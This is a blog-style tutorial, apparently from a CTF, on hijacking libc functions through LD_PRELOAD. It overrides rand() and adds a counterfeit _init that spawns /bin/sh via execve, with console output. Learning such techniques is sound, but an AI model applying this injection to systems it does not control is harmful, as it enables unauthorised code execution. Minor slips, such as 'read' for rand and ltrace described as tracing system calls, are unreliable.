---
date: 'Sun May 10 2020 22:00:00 GMT+0530 (India Standard Time)'
title: 'Hijacking Library Functions and Injecting Code Using the Dynamic Linker'
showcase: true
tags:
  - Hacking
  - Linux
---

Recently I learned about a neat little trick that lets you inject arbitrary code into a program, and lets you alter the behavior of the program to some extent. And all it uses is some custom C code and an innocent-looking environment variable. So yeah, in this post, we’re going to see what it is. I learned this while solving a CTF challenge, so let’s start with that in context.

### The challenge

Create a shared object which spawns a shell using `execve` when used like;

```console
$ LD_PRELOAD=./payload.so /bin/true
```

The original challenge was a bit more involved than this, I’ve trimmed it down to the part that’s relevant to the topic of this article. Before solving this hands-on, we need to brush up on some background knowledge. 


## Linking 101 :: Static vs. dynamic

In this section, I’ll try to briefly explain the compilation process and the difference between static linking and dynamic linking. I’m doing this just because it’s directly relevant to the main content of this post, but I must state that I’m not an expert on this. The explanation will likely be an oversimplification almost to the point of being incorrect, but I’m hoping that for now it'll work as an introduction for the complete beginner. If you already know all this stuff, skip this section. Now that we have that out of the way, let’s see if I can do this.

We all know what libraries are, right? Libraries are reusable code that we just `import` or `include` in our program and use directly. Regardless of experience or competence, all programmers use libraries; they are an inseparable part of the programming process. The usual reasons being 
- Not reinventing the wheel.
- Keeping the source code modular, and thus readable, sane, etc.

### The compilation process

Now, let’s look at the compilation process. First, the compiler _compiles_ your _source code_ into _object_ files. And then _linker_ combines the object files and any libraries that you might need, and creates the final _executable_. This way, the final executable has all the _library functions_ it needs.

So, to reiterate, _linking_ usually means creating an executable, from combining object files and libraries.

Linking can be of two types, static and dynamic.


### Static linking 

Static linking creates an executable that has everything it needs at runtime in itself. When you statically link your compiled object files and libraries, they get embedded in a single file—the final executable. Obviously, this will create a larger executable, but the upside is that you won’t have to depend on the runtime environment.


### Dynamic linking

Dynamic linking does not embed the libraries in the executable; rather, it just leaves a reference mentioning that it needs those library functions at runtime. When the executable is run, another program called _the dynamic linker_ makes sure that those library functions are present in memory, and if they are not, it loads them into memory. All in all, the dynamic linker makes sure that the library functions needed by the executable are present at runtime. There can be confusion of terminology here: the dynamic linker is not the same as the linker; the former is a part of the OS, the latter is used as a part of the compilation process.

In this way, the libraries are genuinely “shared” between different programs at runtime, and the OS doesn’t have to load multiple copies of the same core libraries. That means the available RAM is efficiently utilized. It also reduces the size of the executables and consequently, space on the secondary storage. 


## Hijacking library functions

Now we’re getting into the meat of the discussion. We know what the dynamic linker does in general. But there is a particular behavior of it that we’re going to exploit: The dynamic linker loads any libraries mentioned in the `LD_PRELOAD` environment variable before loading any other libraries. That means, in a way the libraries in `LD_PRELOAD` gets the most priority. This gives possibility of hijacking library calls made from _any_ program, you just have to write an alternate implementation of the library function and mention the shared object file in `LD_PRELOAD`. Let’s explore this concept using an example.

Let's create a simple application which we're going to hijack.
```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]) {
    srand(time(NULL));
    printf("%d\n", rand());
}
```

It’s a straightforward program; it generates a random integer and prints it to the screen.

```console
sumit@HAL9000:~$ gcc random.c -o random
sumit@HAL9000:~$ ./random 
80623719
```

We know this program inside-out, including which library functions it uses because we have access to its source code. But we won’t always have that privilege in the real world. So let’s forget for a while that we have the source code, and let’s try to figure it out from the executable binary.

The easiest way to do this would be running `ltrace`, which intercepts and records the system calls which are called by a process. However, if you’re using some specific versions of _binutils_—the compiler toolchain—`ltrace` might not work on your program. I’ve detailed that problem and some solutions in [this post](/articles/list-external-functions-used-exported-executables-shared-libraries/) and [this post](/articles/using-uftrace-trace-dynamic-library-calls/). If that’s the case for you, use `uftrace`, the installation and usage is outlined [here](/articles/using-uftrace-trace-dynamic-library-calls/). We’re going to go with `uftrace` in this post.

### Using uftrace to detect dynamic library calls

``` console
sumit@HAL9000:~$ uftrace --force -a ./random
558344509
# DURATION     TID     FUNCTION
   3.077 us [  3112] | time();
   4.586 us [  3112] | srand();
   0.736 us [  3112] | rand();
 237.164 us [  3112] | printf("%d\n") = 10;
```

Now, as you can see from the output, `uftrace` lists all the library calls it could intercept// detect. Now we know that it calls `rand` to generate a random number, and we would’ve got this information without the source code. Let’s consider that we want to spoof the program into generating the same number every time. That is, we want to hijack the `rand` function and change its return value, returning a fixed number every time it’s called.

### Writing the rand function

In order to fool the program into using our counterfeit `rand`, it’s signature needs to match exactly with that of the actual `rand`—the function expected by the program. The signature of a function consists of its;

- Name
- Arguments
- Return type

We can get all the details about libc functions using `man`.

``` console
sumit@HAL9000:~$ man 3 rand
```

Looking at the man page, we’ll see that the signature of `read` is the following ::

```c
int rand(void);
```

It’s simple enough in this case, but still, we should read the man page of any and all libc function we’re trying to spoof. The man page also tells us how the functions are supposed to _function_, if we don’t keep in mind those critical functionalities, the program could crash. Knowing these, we can write our counterfeit function.

```c
int rand(void) {
    return 42;
}
```

Let’s compile it into a shared library.

```console
sumit@HAL9000:~$ gcc -shared -fpic shlib.c -o shlib.so
```

This will compile the source file `shlib.c` into the shared object `shlib.so`.

### The exploit

Now that we have a shared library that exports a counterfeit version of `rand`, how can we get the program to use it? We’ve discussed this at the start of the article, but let’s do a quick recap.

Whenever a program launches in Linux, the dynamic linker takes care of loading the required shared libraries. The dynamic linker has a special behavior, it loads the libraries mentioned in the `LD_PRELOAD` environment variable first, so those libraries get the most priority and overrides any other system libraries.

Knowing that, the rest is easy enough.

```console
sumit@HAL9000:~$ LD_PRELOAD=./shlib.so ./random 
42
```

It works!! The `random` program uses the `rand` function from `shlib.so`, and thus it prints 42 every time. Note that setting the environment variable this way will set the variable for that command only, not the whole shell session. Setting the `LD_PRELOAD` variable for your whole session might mess things up, so this is the safer way.

### Some caveats

#### 1. System calls and libc

System calls, like `open`, can be called using three methods; 

- Directly invoking the system call trap// interrupt using proper machine instruction.
- Using the [`syscall`](http://man7.org/linux/man-pages/man2/syscall.2.html) function from libc, which is a thin wrapper that takes care of invoking the appropriate machine instruction properly.
- Using the wrapper function [`open`](http://man7.org/linux/man-pages/man2/open.2.html) from libc.

If the program is using either of the first two methods, you can’t hijack it using this technique.

#### 2. Statically linked libraries

You can not hijack functions from statically linked libraries, because in that case, the libraries functions are embedded in the executable binary itself, it doesn't look for it anywhere else.


## Code injection :: The _init function

Okay, now we know how to hijack library calls. We can even write malicious code in our counterfeit functions, such as spawning a shell, or change the function’s behavior to our advantage.

But `/bin/true` does not call _any_ libc function whatsoever. How can we inject code into that? Enter the `_init` function. The `_init` and `_fini` functions are run at the start and end of the loading process, respectively. It’s true for all programs, regardless of whether it calls any library functions, so we can use this to our advantage. As you can guess, it’s usually used for startup and cleanup tasks of the loading process. But we’re going to write a counterfeit `_init`, and that will execute our malicious code.

Note that nowadays, it’s usually not recommended to use `_init` and `_fini` for startup and cleanup tasks. The modern practice is writing constructors and destructors. You can read about it [here](https://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html). But as we’re not going to write startup tasks anyway, let’s go along with `_init`.

### The exploit

As we already know how the process works, this time, let’s keep it short and get to the point.

```c
#include <unistd.h>

void _init() {
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], &argv[0], NULL);
}
```

Above is the `_init` implementation I wrote; it spawns a shell using `execve`, pretty naughty, eh? Now let’s compile it and `LD_PRELOAD` the compiled library.

```console
sumit@HAL9000:~$ gcc -shared -fpic -nostartfiles shlib.c -o shlib.so
sumit@HAL9000:~$ LD_PRELOAD=./shlib.so ./random 
$ whoami
sumit
$ exit
sumit@HAL9000:~$ LD_PRELOAD=./shlib.so /bin/true
$ 
```

As you can see, the code injection worked for both `random` and `/bin/true`, it spawned a shell! The dynamic linker made sure that the `_init` function gets executed, at the very start of the loading process. Note that when your source code has the `_init` function, you need to pass the `nostartfiles` flag to gcc for it to compile.

## Conclusion

I might have gotten a bit impatient while writing the article, and I rushed a bit; so  there might be mistakes or some portions of it might not be so clear. If you face any problem while following the article, or if you find any mistake, or simply if you have questions to ask, please let me know in the comments and I’ll get back to as soon as possible. Hope this post helps you. Have a great day!

